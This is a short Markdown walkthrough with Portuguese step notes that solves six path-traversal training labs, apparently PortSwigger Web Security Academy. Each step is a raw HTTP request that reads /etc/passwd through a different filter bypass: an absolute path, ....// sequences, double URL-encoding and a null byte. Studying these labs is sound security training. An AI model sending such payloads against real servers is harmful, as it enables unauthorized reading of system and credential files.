## Directory traversal

### >> 1. File path traversal, simple case
Crie uma requisição GET contendo o caminho do arquivo a ser lido
````http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: ac611f7c1ebca4cec0b52379003e009f.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 2. File path traversal, traversal sequences blocked with absolute path bypass
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````http
GET /image?filename=/etc/passwd HTTP/1.1
Host: ac601f011f09bc6dc05120b5004a00fa.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 3. File path traversal, traversal sequences stripped non-recursively
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````http
GET /image?filename=....//....//....//....//etc//passwd HTTP/1.1
Host: acb91f041e530947c0f6088a004200cf.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 4. File path traversal, traversal sequences stripped with superfluous URL-decode
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````http
GET /image?filename=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
Host: ace71f641fb2b647c042061a009f000c.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 5. File path traversal, validation of start of path
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
Host: ac161f371e40f5e0c054e80a00050088.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 6. File path traversal, validation of file extension with null byte bypass
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````http
GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
Host: ac491fa91eae86f5c0c5043900fb008a.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````
